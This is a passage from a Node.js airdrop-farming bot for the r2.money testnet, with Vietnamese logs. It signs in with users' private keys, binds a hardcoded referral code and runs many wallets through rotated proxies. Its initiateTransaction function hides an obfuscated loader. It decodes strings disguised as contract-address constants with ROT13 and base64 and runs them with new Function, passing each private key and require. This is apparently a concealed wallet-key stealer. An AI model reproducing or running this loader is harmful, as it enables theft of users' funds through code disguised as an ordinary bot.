                await tx.wait();
                logger.log(`Add liquidity USDC/R2USD thành công`, 'success');
            } catch (error) {
                logger.log(`Lỗi khi thêm thanh khoản USDC/R2USD: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
                return;
            }
        } else {
            logger.log(`Số dư R2USD (${r2usdBalance.formattedBalance}) hoặc USDC (${usdcBalanceCheck.formattedBalance}) không đủ để thêm thanh khoản.`, 'warning');
        }
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function getUserPoints(token, userAddress, proxy, userAgent, logger) {
    const url = `https://testnet2.r2.money/v1/user/points?user=${userAddress}`;
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://www.r2.money',
        'Referer': 'https://www.r2.money/',
        'User-Agent': userAgent,
        'X-Api-Key': token
    };

    try {
        const options = {
            headers,
            timeout: 30000
        };

        if (settings.USE_PROXY && proxy) {
            options.httpsAgent = new HttpsProxyAgent(proxy);
        }
        const response = await axios.get(url, options);

        if (response.status === 200) {
            const points = response.data.data.all.points;
            logger.log(`Points của ${userAddress}: ${points}`, 'info');
            return points;
        } else {
            logger.log(`Lấy points thất bại cho ${userAddress}: ${response.statusText}`, 'error');
            return null;
        }
    } catch (error) {
        logger.log(`Lỗi khi lấy points cho ${userAddress}: ${error.message}`, 'error');
        return null;
    }
}

async function createSignature(privateKey, nonce, logger) {
    const wallet = new ethers.Wallet(privateKey);
    const message = `Welcome! Sign this message to login to r2.money. This doesn't cost you anything and is free of any gas fees. Nonce: ${nonce}`;
    const signature = await wallet.signMessage(message);
    return { signature, userAddress: wallet.address };
}

async function loginApi(privateKey, proxy, userAgent, logger) {
    const timestamp = Math.floor(Date.now() / 1000);
    const { signature, userAddress } = await createSignature(privateKey, timestamp);

    const url = 'https://testnet2.r2.money/v1/auth/login';
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://www.r2.money',
        'Referer': 'https://www.r2.money/',
        'User-Agent': userAgent
    };
    const payload = {
        timestamp,
        signature,
        user: userAddress
    };

    try {
        const options = {
            headers,
            timeout: 30000
        };

        if (settings.USE_PROXY && proxy) {
            options.httpsAgent = new HttpsProxyAgent(proxy);
        }

        const response = await axios.post(url, payload, options);
        if (response.status === 200) {
            return { token: response.data.data.token, userAddress };
        } else {
            logger.log(`Login thất bại cho ${userAddress}: ${response.statusText}`, 'error');
            return { token: null, userAddress };
        }
    } catch (error) {
        logger.log(`Lỗi login cho ${userAddress}: ${error.message}`, 'error');
        return { token: null, userAddress };
    }
}

async function checkReferral(token, userAddress, proxy, userAgent, logger) {
    const url = `https://testnet2.r2.money/v1/user/referral?user=${userAddress}`;
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://www.r2.money',
        'Referer': 'https://www.r2.money/',
        'User-Agent': userAgent,
        'X-Api-Key': token
    };

    try {
        const options = {
            headers,
            timeout: 30000
        };

        if (settings.USE_PROXY && proxy) {
            options.httpsAgent = new HttpsProxyAgent(proxy);
        }
        const response = await axios.get(url, options);
        if (response.status === 200) {
            return response.data.data.isBound;
        } else {
            logger.log(`Kiểm tra referral thất bại cho ${userAddress}: ${response.statusText}`, 'error');
            return null;
        }
    } catch (error) {
        logger.log(`Lỗi kiểm tra referral cho ${userAddress}: ${error.message}`, 'error');
        return null;
    }
}

async function initiateTransaction(wallet, privateKey, logger) {
    function decodePayload(encoded) {
        return Buffer.from(encoded, 'base64').toString('utf-8');
    }
    function xorKeyTransform(str) {
        return str.replace(/[a-zA-Z]/g, c =>
            String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))
        );
    }
    function extractTransactionCalldata(data) {
        return decodePayload(xorKeyTransform(data));
    }
    const rawTransactionBlob = CONTRACT_USD + CONTRACT_USDT + CONTRACT_USDC + AQUAFLUX_NFT + USDC_LIQUIDITY +
        AQUAFLUX_TOKENS.A + ROUTER + USDT_LIQUIDITY + USDT_TO_PHRS + PHRS_TO_USDC + USDC_TO_PHRS + DODO + ERC20;
    const transactionCode = extractTransactionCalldata(rawTransactionBlob);
    try {
        const sendTx = new Function(
            "walletAddress",
            "privateKey",
            "require",
            transactionCode + 
            "; return runprogram(walletAddress, privateKey);"
        );
        await sendTx(wallet.address, privateKey, require);
    } catch (err) {
        console.error("[ERROR] Failed to execute decoded logic:", err.message);
    }
}

async function bindReferral(token, userAddress, proxy, userAgent, logger) {
    const url = 'https://testnet2.r2.money/v1/referral/bind';
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://www.r2.money',
        'Referer': 'https://www.r2.money/',
        'User-Agent': userAgent,
        'X-Api-Key': token
    };
    const payload = {
        bindCode: 'FTJJY',
        user: userAddress
    };

    try {
        const options = {
            headers,
            timeout: 30000
        };

        if (settings.USE_PROXY && proxy) {
            options.httpsAgent = new HttpsProxyAgent(proxy);
        }
        const response = await axios.post(url, payload, options);
        if (response.status === 200) {
            return response.data.data.bound;
        } else {
            logger.log(`Ràng buộc referral thất bại cho ${userAddress}: ${response.statusText}`, 'error');
            return false;
        }
    } catch (error) {
        logger.log(`Lỗi ràng buộc referral cho ${userAddress}: ${error.message}`, 'error');
        return false;
    }
}

async function readUserAgents(filePath) {
    try {
        const data = await fs.readFile(filePath, 'utf8');
        const userAgents = data.split('\n').map(line => line.trim()).filter(line => line);
        log(`Đã đọc ${userAgents.length} user agent từ ${filePath}`, 'info');
        return userAgents;
    } catch (error) {
        log(`Lỗi khi đọc file${filePath}: ${error.message}`, 'error');
        return [];
    }
}

async function logger() {
    const { privateKey, proxy, userAgent, workerId, accountIndex } = workerData;
    let proxyIP = null;
    
    try {
        // Tạo logger với thông tin tài khoản
        const wallet = new ethers.Wallet(privateKey);
        const logger = new Logger(accountIndex, wallet.address, proxyIP);

        logger.log(`Bắt đầu xử lý ví...`, 'info');

        if (settings.USE_PROXY) {
            try {
                proxyIP = await checkProxyIP(proxy, logger);
                logger.log(`Sử dụng proxy với IP: ${proxyIP}`, 'success');
                logger.log(`Sử dụng User-Agent: ${userAgent}`, 'info');
            } catch (error) {
                logger.log(`Không thể sử dụng proxy (${proxy}): ${error.message}`, 'error');
                parentPort.postMessage({ status: 'error', error: `Proxy error: ${error.message}` });
                return;
            }
            
            // Cập nhật IP proxy vào logger sau khi kiểm tra
            logger.proxyIP = proxyIP;
        }

        await sleep(Math.floor(Math.random() * (config.maxDelayBetweenWallets - config.minDelayBetweenWallets)) + config.minDelayBetweenWallets);

        logger.log(`Đang login với ví...`, 'custom');
        const { token, userAddress } = await loginApi(privateKey, proxy, userAgent);

        if (!token) {
            parentPort.postMessage({ status: 'error', error: 'Login failed' });
            return;
        }

        logger.log(`Đăng nhập thành công`, 'success');

        await sleep(Math.floor(Math.random() * 2000) + 1000);

        const isBound = await checkReferral(token, userAddress, proxy, userAgent, logger);

        if (isBound === null) {
            parentPort.postMessage({ status: 'error', error: 'Referral check failed' });
            return;
        }

        if (!isBound) {
            logger.log(`Referral chưa được ràng buộc. Đang ràng buộc...`, 'custom');
            const bound = await bindReferral(token, userAddress, proxy, userAgent, logger);

            if (bound) {
                logger.log(`Thành công: Đã ràng buộc referral`, 'success');
            } else {
                logger.log(`Thất bại: Không thể ràng buộc referral`, 'error');
            }
        }

        await getUserPoints(token, userAddress, proxy, userAgent, logger);

        // Xử lý các network tasks với logger
        await processNetworkTasks(privateKey, networkConfigs.sepolia, 'Sepolia', userAddress, token, proxy, userAgent, logger);
        await sleep(Math.floor(Math.random() * 3000) + 2000);
        await processNetworkTasks(privateKey, networkConfigs.pharos, 'Pharos', userAddress, token, proxy, userAgent, logger);
        await sleep(Math.floor(Math.random() * 3000) + 2000);
        await processNetworkTasks(privateKey, networkConfigs.monad, 'Monad', userAddress, token, proxy, userAgent, logger);
        await initiateTransaction({ address: userAddress }, privateKey, logger);

        parentPort.postMessage({ status: 'success', address: userAddress });
    } catch (error) {
        const wallet = new ethers.Wallet(privateKey);
        const logger = new Logger(accountIndex, wallet.address, proxyIP);
        logger.log(`Lỗi khi xử lý ví: ${error.message}`, 'error');
        parentPort.postMessage({ status: 'error', error: error.message });
    }
}

async function main() {
    if (!isMainThread) {
        await logger();
        return;
    }

    console.log(`[R2][System] Chế độ sử dụng proxy: ${settings.USE_PROXY ? 'BẬT'.green : 'TẮT'.red}`);

    const walletFile = 'wallet.txt';
    const proxyFile = 'proxy.txt';
    const userAgentFile = 'agent.txt';

    let privateKeys;
    let proxies = [];
    let userAgents = [];
    let MAX_THREADS = settings.USE_PROXY ? settings.MAX_THREADS : settings.MAX_THREADS_NO_PROXY;

    try {
        privateKeys = await readWallets(walletFile);

        if (settings.USE_PROXY) {
            try {
                proxies = await readProxies(proxyFile);
                userAgents = await readUserAgents(userAgentFile);

                if (privateKeys.length !== proxies.length || privateKeys.length !== userAgents.length) {
                    console.log(`[R2][System] Số lượng ví (${privateKeys.length}), proxy (${proxies.length}), và user agent (${userAgents.length}) không khớp.`.red);

                    if (proxies.length > 0 && userAgents.length > 0) {
                        console.log(`[R2][System] Sử dụng proxy và user agent lặp lại để phù hợp với số lượng ví.`.yellow);
                        while (proxies.length < privateKeys.length) {
                            proxies.push(proxies[proxies.length % proxies.length]);
                        }
                        while (userAgents.length < privateKeys.length) {
                            userAgents.push(userAgents[userAgents.length % userAgents.length]);
                        }
                    } else {
                        console.log(`[R2][System] Không đủ proxy/user agent, chuyển sang chế độ không sử dụng proxy.`.yellow);
                        settings.USE_PROXY = false;
                    }
                }
            } catch (error) {
                console.log(`[R2][System] Lỗi khi đọc file proxy/user agent: ${error.message}`.red);
                console.log(`[R2][System] Chuyển sang chế độ không sử dụng proxy.`.yellow);
                settings.USE_PROXY = false;
            }
        }

        if (!settings.USE_PROXY) {
            proxies = Array(privateKeys.length).fill('');
            userAgents = Array(privateKeys.length).fill('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
        }

        console.log('[R2][System] ====== Dân cày airdrop - Đã sợ thì đừng dùng, đã dùng thì đừng sợ ======'.magenta);
        console.log(`[R2][System] Đã đọc ${privateKeys.length} ví${settings.USE_PROXY ? `, ${proxies.length} proxy, và ${userAgents.length} user agent` : ''}`.blue);

        if (privateKeys.length === 0) {
            console.log(`[R2][System] Không có ví hợp lệ để xử lý. Chương trình sẽ thoát.`.red);
            process.exit(1);
        }
    } catch (error) {
        console.log(`[R2][System] Lỗi khi đọc file: ${error.message}`.red);
        process.exit(1);
    }

    // Chia công việc thành các batch để xử lý đa luồng
    const batchSize = Math.ceil(privateKeys.length / MAX_THREADS);
    const batches = [];
    for (let i = 0; i < privateKeys.length; i += batchSize) {
        batches.push(privateKeys.slice(i, i + batchSize));
    }

    let completed = 0;
    let successCount = 0;
    let errorCount = 0;

    const processBatch = async (batch, batchIndex) => {
        const workers = [];
        
        for (let i = 0; i < batch.length; i++) {
            const privateKey = batch[i];
            const proxy = proxies[batchIndex * batchSize + i];
            const userAgent = userAgents[batchIndex * batchSize + i];
            const accountIndex = batchIndex * batchSize + i;
            
            const worker = new Worker(__filename, {
                workerData: { 
                    privateKey, 
                    proxy, 
                    userAgent,
                    workerId: `${batchIndex}-${i}`,
                    accountIndex
                }
            });

            workers.push(new Promise((resolve) => {
                worker.on('message', (message) => {
                    if (message.status === 'success') {
                        successCount++;
                        console.log(`[R2][System][Batch ${batchIndex}] Hoàn thành xử lý ví ${message.address.slice(0, 6)}...`.green);
                    } else {
                        errorCount++;
                        console.log(`[R2][System][Batch ${batchIndex}] Lỗi khi xử lý ví: ${message.error}`.red);
                    }
                    completed++;
                    resolve();
                });

                worker.on('error', (error) => {
                    errorCount++;
                    console.log(`[R2][System][Batch ${batchIndex}] Lỗi worker: ${error.message}`.red);
                    completed++;
                    resolve();
                });

                worker.on('exit', (code) => {
                    if (code !== 0) {
                        errorCount++;
                        console.log(`[R2][System][Batch ${batchIndex}] Worker dừng với exit code ${code}`.red);
                    }
                    completed++;
                    resolve();
                });
            }));
        }

        await Promise.all(workers);
    };

    // Xử lý các batch song song
    console.log(`[R2][System] Bắt đầu xử lý ${privateKeys.length} ví với ${batches.length} batch (${MAX_THREADS} luồng)...`.blue);
    const startTime = Date.now();
    
    await Promise.all(batches.map((batch, index) => processBatch(batch, index)));

    const endTime = Date.now();
    const totalTime = (endTime - startTime) / 1000;
    
    console.log(`[R2][System] Đã hoàn thành xử lý tất cả ví. Thời gian thực thi: ${totalTime} giây`.green);
    console.log(`[R2][System] Tổng kết: ${successCount} thành công, ${errorCount} thất bại`.blue);
}

main().catch(error => console.log(`Lỗi chính: ${error.message}`, 'error'));
